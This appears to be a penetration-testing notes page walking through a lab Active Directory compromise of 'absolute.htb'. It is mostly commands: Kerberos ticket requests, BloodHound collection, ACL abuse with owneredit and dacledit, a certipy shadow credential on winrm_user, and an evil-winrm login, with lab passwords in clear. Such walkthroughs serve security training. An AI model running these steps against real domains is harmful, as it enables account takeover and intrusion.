---
description: ACL Abuse and Shadow Credential
---

# Kerberos based Enum and Attack Samples

## Preparation

{% code overflow="wrap" %}
```bash
# Get TGT for a user
impacket-getTGT 'absolute.htb/d.klay:Darkmoonsky248girl' -dc-ip $RHOST

# Inject it into memory 
export KRB5CCNAME=./d.klay.ccache 
```
{% endcode %}

## Enumeration

### LDAP

```bash
crackmapexec ldap dc.absolute.htb --use-kcache --users 
```

<figure><img src="../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

### SMB&#x20;

```
crackmapexec smb dc.absolute.htb --use-kcache --shares
```

<figure><img src="../../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

### Bloodhound

{% code overflow="wrap" %}
```bash
bloodhound.py -k -u m.lovegod -p AbsoluteLDAP2022! --auth-method kerberos -d absolute.htb -dc dc.absolute.htb -ns 10.129.228.64 --dns-tcp --zip -c All
```
{% endcode %}

## Exploitation - ACL Abuse and Shadow Credential

Get a Bloodhound result below. The m.lovegod owns the Network Audit group, which has `GenericWrite` on the winrm\_user user. &#x20;

To get access to the machine, I’ll first I’ll need to give m.lovegod write access on the Network Audit group. Then I can add m.lovegod to the group. Finally, I can use those permissions to create a shadow credential for the winrm\_user account to access to the machine via evil\_winrm.&#x20;

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

Update the ownership of the user to add a 'write permission'.&#x20;

{% code overflow="wrap" %}
```bash
# Domain: absolute.htb
# User: m.lovegod
# Group: Network Audit
# Action: give write permission

python3 /opt/python/impacket/impacket/examples/owneredit.py -k -no-pass absolute.htb/m.lovegod -dc-ip dc.absolute.htb -new-owner m.lovegod -target 'Network Audit' -action write
```
{% endcode %}

Add the full control of Group to the user.&#x20;

{% code overflow="wrap" %}
```bash
# Domain: absolute.htb
# User: m.lovegod
# Group: Network Audit
# Action: give write permission
# Right: FullControl

python3 /opt/python/impacket_porgs/impacket/examples/dacledit.py -k -no-pass absolute.htb/m.lovegod -dc-ip dc.absolute.htb -principal m.lovegod -target "Network Audit" -action write -rights FullControl
```
{% endcode %}

Add the user to the group.&#x20;

{% code overflow="wrap" %}
```bash
# Domain: absolute.htb
# User: m.lovegod
# Group: Network Audit
Kali> kinit m.lovegod
Kali> net rpc group addmem "Network Audit" -U 'm.lovegod' -k -S dc.absolute.htb m.lovegod

# or 
Kali> net rpc group members "Network Audit" -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
```
{% endcode %}

Create a Shadow Credential.&#x20;

{% code overflow="wrap" %}
```bash
# Let's find ADCS environment. You will see some ADCS configurations. 
KRB5CCNAME=./d.klay.ccache  certipy find -username m.lovegod@absolute.htb -k -target dc.absolute.htb 

# Let's add the shadow credential to the winrm_user user 
KRB5CCNAME=./d.klay.ccache certipy shadow auto -username m.lovegod@absolute.htb -account winrm_user -k -target dc.absolute.htb 

# Let's connect to the machine
KRB5CCNAME=./winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

